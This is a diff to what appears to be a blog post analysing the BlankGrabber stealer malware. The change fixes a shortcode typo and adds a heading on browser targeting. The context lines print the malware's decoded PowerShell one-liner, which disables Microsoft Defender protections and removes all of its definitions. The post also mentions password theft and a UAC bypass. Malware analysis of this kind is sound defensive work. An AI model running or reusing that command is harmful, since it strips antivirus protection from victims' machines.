@@ -274,7 +274,7 @@ More notably, we notice it also has the capability of killing Microsoft Defender
 
 which decodes to the script below. It essentially disables the [IPS (exploitation of known vulns)](https://learn.microsoft.com/en-us/powershell/module/defender/remove-mppreference?view=windowsserver2025-ps#-disableintrusionpreventionsystem), [IO AV Protection (File download scan)](https://learn.microsoft.com/en-us/powershell/module/defender/remove-mppreference?view=windowsserver2025-ps#-disableioavprotection), [Real time Monitoring](https://learn.microsoft.com/en-us/powershell/module/defender/remove-mppreference?view=windowsserver2025-ps#-disablerealtimemonitoring), [Script scanning](https://learn.microsoft.com/en-us/powershell/module/defender/remove-mppreference?view=windowsserver2025-ps#-disablescriptscanning), [Controlled folder access](https://learn.microsoft.com/en-us/powershell/module/defender/remove-mppreference?view=windowsserver2025-ps#-disablescriptscanning), [Network protection](https://learn.microsoft.com/en-us/powershell/module/defender/remove-mppreference?view=windowsserver2025-ps#-enablenetworkprotection), [MAPS reporting](https://learn.microsoft.com/en-us/powershell/module/defender/remove-mppreference?view=windowsserver2025-ps#-mapsreporting), prevents suspicious sample submission and finally removes all definitions in Defender.
 
-{{< higlight powershell>}}
+{{< highlight powershell>}}
 powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2 & "%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 {{ /highlight}}
 
@@ -288,3 +288,6 @@ It can also extract WiFi passwords, setup a UAC bypass, embed itself in the star
 
 {{< emgithub target="https://github.com/cyb3rjerry/revengd-malware/blob/6ae8ebb5279ae177e026dd7b0015569d5e423b5b/blankgrabber/blankgrabber.py#L361-L371" lang="py" hl="364">}}
 
+### How it targets browsers
+
+Due to the prevalence of Chromium (Brave, Chrome, Opera, ...)
